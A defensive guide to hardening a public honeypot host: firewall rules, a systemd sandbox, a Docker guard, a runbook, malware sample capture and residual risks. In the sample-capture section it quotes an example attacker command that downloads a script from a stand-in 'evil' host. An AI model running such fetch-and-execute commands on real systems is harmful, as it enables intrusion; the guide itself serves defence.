# Hardening a public honeypot host

The goal is two things at once, and they pull in opposite directions:

1. **The honeypots are reachable by everyone and answer like the real services**, so the traffic
   you collect is genuine: scanners, credential sprayers, exploit tools, malware droppers.
2. **A compromised honeypot is a dead end.** Whoever takes over a decoy, the service process or
   the control plane gets no route to root, no route to other machines, and no route to your data
   or your laptop.

Nothing here makes a honeypot harder to attack. Every honeypot port stays open to the whole
internet with no rate limit, geo-block, ban list or fail2ban. What is hardened is everything
*around* the honeypots.

## What is reachable from the internet

| Port | What | Open to |
|---|---|---|
| The honeypot ports you choose (22, 23, 80, 110, 3389, ...) | The decoys | Everyone, unlimited |
| The admin SSH port (default 2200) | Your management channel | Everyone, 6 new connections/min/source; or only `--admin-allow` addresses |
| Everything else | Control plane (18443), metrics (19090), canary (18888), console, Docker, anything an installer starts later | **Nobody** (default-drop firewall) |

The control plane, metrics and the canary server also bind to `127.0.0.1`, the console is off,
and the control plane is reached over an SSH tunnel. The port numbers were moved off their
defaults (8000/9090/8888) so a stray `localhost:8000` is never this server; that is housekeeping,
not protection. The protection is the loopback bind, the firewall and the tokens.

## The layers

**Network: `src/honeypot_mcp/hardening/firewall.py` (nftables table `inet hp_fw`)**

- `input` defaults to drop. It accepts loopback, established traffic, the ICMP a host needs, the
  admin port (rate limited per source, optionally allow-listed) and exactly the ports the engines
  listen on.
- Privileged public ports (80, 110) are redirected to the unprivileged ports the engines bind
  (8080, 1110), only for traffic addressed to the host. The service runs with no capabilities and
  never binds below 1024.
- Docker-published ports (the Cowrie SSH/Telnet honeypots) are forwarded by Docker, not input, so
  they need no rule; `userland-proxy` is off so no `docker-proxy` process listens either. The forward
  chain does cap new connections per source on those ports at 128 concurrent (`ct count`): Cowrie has
  no limit of its own, and one host opening ~2,400 sessions got the Telnet container OOM-killed.
- Optional port sets: `--ftp-pasv-ports MIN-MAX` opens the FTP honeypot's passive data range (set
  `FTP_PASV_PORT_MIN/MAX` to the same range), and the NFS honeypot is reached by redirecting both 111
  and 2049 to its listening port (`--ports "...,2049>12049,111>12049"`, [DEPLOY.md](DEPLOY.md) step 6).
- `forward`: containers cannot start connections (default), and may not open one to the host
  itself. A hijacked Cowrie cannot scan, relay, brute-force or reach the cloud metadata service.
- `output`: the service user may only answer connections made to it, resolve names and open new
  HTTPS connections (alert webhooks, threat intel). A hijacked service process cannot scan or
  reach anything else. Root, your admin session and `apt` are unrestricted.
- Only this one table is created and deleted; Docker's tables and the rest of the host are never
  touched. The ruleset is rendered by code that refuses a specification that would strand you
  (the admin port inside the honeypot ports, a redirect that hijacks it, an unknown egress mode).

**Host: `deploy/harden-host.sh`**

- sshd: key-only, no root, `AllowUsers <you>`, 3 auth tries, no X11 or agent forwarding, **local
  forwarding only** (the MCP tunnel needs `-L`; `-R` is refused).
- Kernel (`sysctl`): reverse-path filtering, no redirects or source routing, SYN cookies, hidden
  kernel pointers, restricted `dmesg`/`ptrace`/unprivileged BPF, protected links and FIFOs.
- Docker daemon: `userland-proxy: false`, `icc: false` (containers cannot talk to each other),
  `no-new-privileges`, `live-restore`, capped logs.
- Unattended security updates, with no automatic reboot.

**Process: the systemd units**

- `honeypot-mcp.service` runs as `honeypot`, **not in the `docker` group**, with no capabilities,
  `ProtectSystem=strict` (only `data/ reports/ tls/ pcap/` are writable; code, venv and `.env` are
  read-only so a compromise cannot persist by rewriting itself), `ProtectProc=invisible`, a
  syscall deny-list (privilege changes, mounts, modules, raw I/O, reboot, ...), no core dumps and
  a memory ceiling. `systemd-analyze security` scores it 1.4 (OK).
- `honeypot-docker-guard.service` is the only process that both parses a request from the service
  and holds Docker access. See below. It has no network at all (`PrivateNetwork`), scores 0.6.

**Containers: the Docker guard (`src/honeypot_mcp/hardening/docker_guard.py`)**

Membership of the `docker` group is root: anyone who can ask the daemon can start a privileged
container with `/` mounted. The service parses attacker-controlled bytes all day, so the service
is kept out of the group and talks to the guard's unix socket instead. The guard forwards only what
the SSH engine does: create a container from exactly the pinned `cowrie/cowrie` image, named
`honeypot-*`, labelled `honeypot-mcp=true`, with the engine's own settings (all capabilities
dropped, read-only root, no-new-privileges, bridge network, memory/PID/CPU ceilings, the two Cowrie
ports, the engine's tmpfs mounts and one anonymous volume); start/stop/restart/kill/pause/inspect/
logs/remove/archive of *labelled* containers; list containers filtered to the label; pull the
pinned image. Everything else gets a 403 before it reaches Docker: privileged mode, host paths,
host namespaces, devices, exec, attach, other images, networks, volumes, `info`, other containers.
The guard's create check is built from the same `cowrie_limits.py` the engine reads, and a unit
test runs the real engine and checks its request passes, so the two cannot drift apart.

**Control plane: roles**

Three tokens, one per role. Use `viewer` for reading (it cannot even see the deploy tools),
`operator` while deploying, and keep `admin` off any model-driven session. Captured usernames,
paths and commands are attacker-written strings that reach the model's context.

## Runbook

[DEPLOY.md](DEPLOY.md) steps 2-7 are the short version. In order:

```bash
sudo UV_PYTHON_INSTALL_DIR=/opt/uv-python uv sync --frozen --no-dev --python 3.12   # shared interpreter
sudo deploy/harden-host.sh prepare  --admin-user deploy     # sshd on 22 AND 2200, users, sysctl, units
#   new terminal:  ssh -p 2200 deploy@<ip>                    <- must work
sudo install -m 0640 -o root -g honeypot deploy/env.production.example .env   # then edit the tokens
sudo deploy/harden-host.sh finalize --admin-user deploy --confirm-admin-port-tested \
     --ports "80>8080,3389,110>1110" --docker-ports 22,23
#   new terminal:  ssh -p 2200 deploy@<ip>                    <- must still work; else do nothing
sudo deploy/harden-host.sh confirm                          # persist firewall + guard
sudo systemctl enable --now honeypot-mcp
sudo deploy/harden-host.sh status                           # and: scripts/preflight.sh ... (as root)
```

`finalize` loads the firewall with a dead-man's switch: unless you run `confirm` within
`--rollback-seconds` (default 120) the table removes itself. If sshd does not come up on the new
port it puts port 22 back and stops. `prepare` is idempotent and will not reopen port 22 after
`finalize`. Each phase supports `--dry-run`.

## Malware sample capture (optional)

By default Cowrie's containers may not start connections, so a `wget http://evil/x.sh` an attacker
types *fails* (the URL is still logged from the command line). To also capture the downloaded
file:

```bash
sudo deploy/harden-host.sh finalize ... --egress limited     # --dns IP,IP to override the detection
# and in .env:  COWRIE_ALLOW_EGRESS=true
```

Without `--dns` the script reads the host's upstream resolvers (what containers inherit; not
systemd-resolved's `127.0.0.53` stub) and tells you which it will allow. Containers may then reach
**public** web servers (80/443) and those resolvers only, at 30 new
connections a minute and 512 KB/s, never private space, the host, the cloud metadata service or any
other port. The tradeoff is real and yours to take: a hijacked Cowrie becomes a very small HTTP
client the attacker steers, and a provider's acceptable-use policy covers outbound abuse. The
limits make it a poor tool for harm, not an impossible one. Closed is the default.

## End of the run

Run this **from your laptop** (it needs `ssh`, `tar` and `sqlite3` there; macOS has all three):

```bash
scripts/fetch_backup.sh --host <droplet-ip> --key ~/.ssh/honeypot_deploy \
    --dest ~/hp-backups --samples --expect-types ssh,telnet,http,ftp,rdp,smb
```

It takes a consistent backup on the VPS, streams it back over one SSH connection, **checks the
transfer** (the database's SHA-256 here must equal the one computed on the VPS) and the
database (`PRAGMA integrity_check`), pulls Cowrie's downloaded files and TTY recordings into a
`samples-QUARANTINE/` folder (stripped of every permission bit, symlinks removed, SHA-256 list
beside them; they are live malware), and prints a **report that says whether the run worked**:
the time window, events per sensor, dead sensors, sensors that recorded nothing, hours with no
activity at all, top sources and credentials, honeytoken trips, platform alerts, and a
PASS/WARN/FAIL verdict. It treats the VPS as hostile: the archive's paths are checked before
anything is unpacked. It is safe to run mid-run (take one after the first night: a suspended
account would otherwise take the data with it) and as often as you like; each run is a separate
backup. Re-read a backup you already have with `scripts/fetch_backup.sh report <backup-dir>`.

```bash
sudo deploy/harden-host.sh teardown --i-have-a-backup       # stop, remove containers and firewall
```

Then **destroy the VPS** in the provider console (a powered-off droplet keeps its disk and is, as
far as I know, still billed). Do not reuse it for anything else. The backup holds secrets
(`.env` tokens, honeytoken values, TLS keys): store it where you would store the `.env`.
Cowrie's downloads live in a tmpfs, which `docker cp` cannot read, so the script runs Python
inside the container to copy them; they exist only while the container does, so fetch before
teardown. Packet capture is a bounded ring (100 MB x 10 by default): use `pcap_extract` for the
attackers you care about during the run.

## What was verified, and how

All of it ran on an Ubuntu 22.04 systemd host (a privileged container running systemd, a real
`dockerd` 29, nftables 1.0.2, a second container as the attacker, the MCP client reaching the control
plane through an SSH tunnel), not just in unit tests:

- the whole runbook, including re-running `prepare` after `finalize`, the rollback timer firing,
  `confirm`, `status` and `teardown`; `shellcheck` clean;
- a full TCP scan of the host shows exactly the honeypot ports and the admin port; the control plane,
  metrics, canary and console ports are filtered even while listening;
- real clients: `nmap -sV` identifies OpenSSH 9.2p1, Linux telnetd, nginx, Dovecot and Terminal
  Services; an SSH login attempt is captured by Cowrie with the real source address;
- a compromised-service simulation (as the `honeypot` user): the real Docker socket is refused,
  the guard refuses a privileged container and `info`, outbound connections to anything but HTTPS
  are rejected, nothing outside `data/` is writable;
- container egress on the real Docker bridges: a container reaches nothing in closed mode and, with
  the table removed as a control, reaches the internet; in limited mode it reaches public HTTP/HTTPS
  only;
- the viewer token cannot deploy, a wrong token is refused, a remote SSH forward is refused;
- unit tests, and Docker-gated integration tests that load the ruleset into a real kernel and run the
  real SSH engine through the real guard.

Bugs this found and fixed, which unit tests had passed: the documented `uv sync` as root leaves the
service unable to execute its own interpreter; re-running `prepare` reopened port 22; the guard
tried to `chown` its socket, which the unit's syscall filter forbids; the pre-flight rejected the
documented `root:honeypot 0640` `.env` and probed the guard as root, which it refuses; sshd was
checked for its new port before it had re-bound.

## Residual risks

Hardening reduces risk; it does not remove it. Know what is left:

- **A shared kernel.** Cowrie runs in a container, not a VM. A kernel or runc/containerd exploit
  from inside a container escapes to the host. Mitigations: all capabilities dropped, read-only
  root, no-new-privileges, the default seccomp profile, memory/PID limits, `icc: false`, security
  updates on. A dedicated VPS you destroy afterwards is the real answer.
- **The in-process engines and the control plane share one process.** A memory-safety or parsing bug
  in an engine that gives code execution gives the control plane, its database and its tokens.
  The sandbox bounds what that process can do (no root, no Docker, no outbound except HTTPS, no
  writes outside `data/`), not whether it can be taken.
- **HTTPS egress** from the service is open (alert webhooks, threat intel): a hijacked process could
  exfiltrate to any HTTPS host. Pin or remove the integrations you do not use.
- **Provider policy.** Check your provider's acceptable-use policy; some prohibit open mail relays or
  resolvers (leave SMTP and DNS out of a first run) or "security research" on their platform.
- **Denial of service.** A flood can fill disk or exhaust connections. Per-IP connection caps, a disk
  floor alert and `MemoryMax` bound it; they do not prevent it.
- **Your own mistakes.** The viewer token in your client config, your deploy key, the data you copy
  off the host. Treat all of it as material that came from a hostile network.
